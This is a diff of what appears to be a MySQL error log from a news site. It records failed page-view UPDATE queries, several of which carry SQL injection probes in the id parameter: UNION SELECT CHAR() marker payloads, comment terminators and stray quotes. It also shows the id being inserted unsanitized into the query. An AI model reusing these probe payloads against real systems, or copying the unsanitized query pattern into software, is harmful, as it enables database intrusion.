+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45) --  /*' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45) --  /*
+
+Time : 10:29:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45) --  /*' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45) --  /*
+
+Time : 10:23:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''"' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6384'"
+
+Time : 09:45:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7733/
+
+Time : 09:45:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7737/
+
+Time : 08:32:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''A=0' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7720'A=0
+
+Time : 01:06:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
